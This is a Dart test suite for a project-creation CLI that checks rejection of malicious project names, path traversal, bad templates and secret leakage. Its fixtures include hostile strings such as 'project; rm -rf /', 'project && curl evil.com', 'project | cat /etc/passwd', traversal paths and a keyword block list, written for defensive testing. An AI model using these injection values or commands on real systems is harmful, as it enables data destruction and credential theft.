import 'dart:convert';
import 'dart:io';

import 'package:flutter_test/flutter_test.dart';
import 'package:path/path.dart' as path;
import '../helpers/cli_test_helper.dart';
import '../helpers/test_temp_dir.dart';

void main() {
  final temp = TestTempDir();

  setUpAll(temp.initSuite);
  setUp(temp.beforeEach);
  tearDown(temp.afterEach);
  tearDownAll(temp.cleanupSuite);

  group('Security Review', () {
    late CliTestHelper cli;

    setUp(() {
      cli = CliTestHelper(temp.currentTestDir);
    });

    group('Input Validation Security', () {
      test('project name injection attempts are blocked', () async {
        final maliciousNames = [
          'project; rm -rf /',
          'project && curl evil.com',
          'project | cat /etc/passwd',
          'project`whoami`',
          r'project$(id)',
          'project; ls -la',
          'project && echo "hacked"',
        ];

        for (final maliciousName in maliciousNames) {
        final result = await cli.createProject(maliciousName);

          expect(result.exitCode, equals(1));
          
          final output = json.decode(result.stdout as String) as Map<String, dynamic>;
          expect(output['success'], isFalse);
          expect((output['error'] as Map<String, dynamic>)['message'], contains('Invalid project name'));
        }
      });

      test('path traversal attempts are blocked', () async {
        final traversalPaths = [
          '../../../etc/passwd',
          r'..\..\..\windows\system32',
          '....//....//....//etc//passwd',
          '../etc/passwd',
          r'..\windows\system32',
        ];

        for (final traversalPath in traversalPaths) {
          final result = await cli.createProject(traversalPath);

          expect(result.exitCode, equals(1));
          
          final output = json.decode(result.stdout as String) as Map<String, dynamic>;
          expect(output['success'], isFalse);
        }
      });

      test('special characters in input are handled safely', () async {
        const specialChars = [
          'project<test>',
          'project"test"',
          "project'test'",
          'project\ntest',
          'project\ttest',
          'project\rtest',
          'project0test',
        ];

        for (final specialChar in specialChars) {
          final result = await cli.createProject(specialChar);

          expect(result.exitCode, equals(1));
          
          final output = json.decode(result.stdout as String) as Map<String, dynamic>;
          expect(output['success'], isFalse);
        }
      });

      test('very long input is handled safely', () async {
        final longName = 'a' * 10000;
        
        final result = await cli.createProject(longName);

        expect(result.exitCode, equals(1));
        
        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
        expect(output['success'], isFalse);
      });
    });

    group('File System Security', () {
      test('file operations are restricted to working directory', () async {
        const projectName = 'file_security_test';
        
        final result = await cli.createProject(projectName);

        expect(result.exitCode, equals(0));
        
        final projectPath = path.join(temp.currentTestDir.path, projectName);
        expect(Directory(projectPath).existsSync(), isTrue);
        
        // Verify files are created only in the project directory
        expect(File(path.join(projectPath, 'pubspec.yaml')).existsSync(), isTrue);
        expect(File(path.join(projectPath, 'lib', 'main.dart')).existsSync(), isTrue);
        
        // Verify no files are created outside the project directory
        expect(File(path.join(temp.currentTestDir.path, '..', 'malicious_file.txt')).existsSync(), isFalse);
      });

      test('directory traversal in file operations is prevented', () async {
        const projectName = 'traversal_test';
        
        final result = await cli.createProject(projectName);

        expect(result.exitCode, equals(0));
        
        final projectPath = path.join(temp.currentTestDir.path, projectName);
        
        // Verify project files are created in correct location
        expect(File(path.join(projectPath, 'pubspec.yaml')).existsSync(), isTrue);
        
        // Verify no files are created in parent directories
        expect(File(path.join(temp.currentTestDir.path, '..', 'pubspec.yaml')).existsSync(), isFalse);
      });

      test('file permissions are set correctly', () async {
        const projectName = 'permissions_test';
        
        final result = await cli.createProject(projectName);

        expect(result.exitCode, equals(0));
        
        final projectPath = path.join(temp.currentTestDir.path, projectName);
        
        // Verify files are readable
        final pubspecFile = File(path.join(projectPath, 'pubspec.yaml'));
        expect(pubspecFile.existsSync(), isTrue);
        
        final content = pubspecFile.readAsStringSync();
        expect(content, isNotEmpty);
      });
    });

    group('Command Injection Security', () {
      test('command arguments are properly escaped', () async {
        const projectName = 'command_injection_test';
        
        final result = await cli.createProject(projectName, organization: 'com.test; rm -rf /');

        expect(result.exitCode, equals(0));
        
        final projectPath = path.join(temp.currentTestDir.path, projectName);
        expect(Directory(projectPath).existsSync(), isTrue);
        
        // Verify project was created successfully despite malicious organization
        expect(File(path.join(projectPath, 'pubspec.yaml')).existsSync(), isTrue);
      });

      test('template names are validated', () async {
        const projectName = 'template_validation_test';
        
        final result = await cli.createProject(projectName, template: '../../../etc/passwd');

        expect(result.exitCode, equals(1));
        
        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
        expect(output['success'], isFalse);
        expect((output['error'] as Map<String, dynamic>)['message'], contains('Template'));
      });

      test('platform arguments are validated', () async {
        const projectName = 'platform_validation_test';
        
        final result = await cli.createProject(projectName, platforms: ['malicious_platform']);

        expect(result.exitCode, equals(1));
        
        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
        expect(output['success'], isFalse);
      });
    });

    group('JSON Output Security', () {
      test('JSON output is properly escaped', () async {
        const projectName = 'json_security_test';
        
        final result = await cli.createProject(projectName);

        expect(result.exitCode, equals(0));
        expect(result.stdout, isNotEmpty);
        
        // Verify JSON is valid and properly escaped
        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
        expect(output, isA<Map<String, dynamic>>());
        expect(output['success'], isTrue);
      });

      test('error messages in JSON are safe', () async {
        final result = await cli.createProject('invalid<project>name');

        expect(result.exitCode, equals(1));
        expect(result.stdout, isNotEmpty);
        
        // Verify error JSON is valid and safe
        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
        expect(output, isA<Map<String, dynamic>>());
        expect(output['success'], isFalse);
        expect(output['error'], isA<Map<String, dynamic>>());
      });
    });

    group('Resource Exhaustion Security', () {
      test('large project names are handled safely', () async {
        final largeName = 'a' * 1000;
        
        final result = await cli.createProject(largeName);

        expect(result.exitCode, equals(1));
        
        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
        expect(output['success'], isFalse);
      });

      test('multiple concurrent operations are handled safely', () async {
        final projectNames = List.generate(10, (index) => 'concurrent_security_test_$index');
        final futures = <Future<ProcessResult>>[];
        
        for (final projectName in projectNames) {
          futures.add(cli.createProject(projectName));
        }
        
        final results = await Future.wait(futures);
        
        // Verify all operations completed successfully
        for (final result in results) {
          expect(result.exitCode, equals(0));
        }
      });
    });

    group('Template Security', () {
      test('template content is safe', () async {
        const projectName = 'template_security_test';
        
        final result = await cli.createProject(projectName);

        expect(result.exitCode, equals(0));
        
        final projectPath = path.join(temp.currentTestDir.path, projectName);
        
        // Check generated files for suspicious content
        final pubspecContent = File(path.join(projectPath, 'pubspec.yaml')).readAsStringSync();
        expect(pubspecContent.contains('rm -rf'), isFalse);
        expect(pubspecContent.contains('curl'), isFalse);
        expect(pubspecContent.contains('wget'), isFalse);
        expect(pubspecContent.contains('eval'), isFalse);
        
        final mainContent = File(path.join(projectPath, 'lib', 'main.dart')).readAsStringSync();
        expect(mainContent.contains('rm -rf'), isFalse);
        expect(mainContent.contains('curl'), isFalse);
        expect(mainContent.contains('wget'), isFalse);
        expect(mainContent.contains('eval'), isFalse);
      });

      test('template variables are properly escaped', () async {
        const projectName = 'template_escape_test';
        
        final result = await cli.createProject(projectName);

        expect(result.exitCode, equals(0));
        
        final projectPath = path.join(temp.currentTestDir.path, projectName);
        
        // Check that project name is properly escaped in generated files
        final pubspecContent = File(path.join(projectPath, 'pubspec.yaml')).readAsStringSync();
        expect(pubspecContent.contains('name: $projectName'), isTrue);
        
        final mainContent = File(path.join(projectPath, 'lib', 'main.dart')).readAsStringSync();
        expect(mainContent.contains('TemplateEscapeTestApp'), isTrue);
      });
    });

    group('Network Security', () {
      test('no network requests are made during project creation', () async {
        const projectName = 'network_security_test';
        
        final result = await cli.runCommand('create', args: [projectName, '--template=minimal', '--offline']);

        expect(result.exitCode, equals(0));
        
        final projectPath = path.join(temp.currentTestDir.path, projectName);
        expect(Directory(projectPath).existsSync(), isTrue);
      });

      test('doctor command does not leak sensitive information', () async {
        final result = await cli.runCommand('doctor');

        expect(result.exitCode, equals(0));
        
        final output = json.decode(result.stdout as String) as Map<String, dynamic>;
        expect(output['success'], isTrue);
        
        // Verify no sensitive information is leaked
        final outputString = json.encode(output);
        expect(outputString.contains('password'), isFalse);
        expect(outputString.contains('secret'), isFalse);
        expect(outputString.contains('token'), isFalse);
        expect(outputString.contains('key'), isFalse);
      });
    });

    group('Process Security', () {
      test('no external processes are spawned unnecessarily', () async {
        const projectName = 'process_security_test';
        
        final result = await cli.createProject(projectName);

        expect(result.exitCode, equals(0));
        
        final projectPath = path.join(temp.currentTestDir.path, projectName);
        expect(Directory(projectPath).existsSync(), isTrue);
        
        // Verify project was created without spawning external processes
        expect(File(path.join(projectPath, 'pubspec.yaml')).existsSync(), isTrue);
      });

      test('plan mode does not execute dangerous operations', () async {
        const projectName = 'plan_security_test';
        
        final result = await cli.runCommand('create', args: [projectName, '--template=minimal', '--plan']);

        expect(result.exitCode, equals(0));
        
        // Verify no files were created in plan mode
        final projectPath = path.join(temp.currentTestDir.path, projectName);
        expect(Directory(projectPath).existsSync(), isFalse);
      });
    });
  });
}
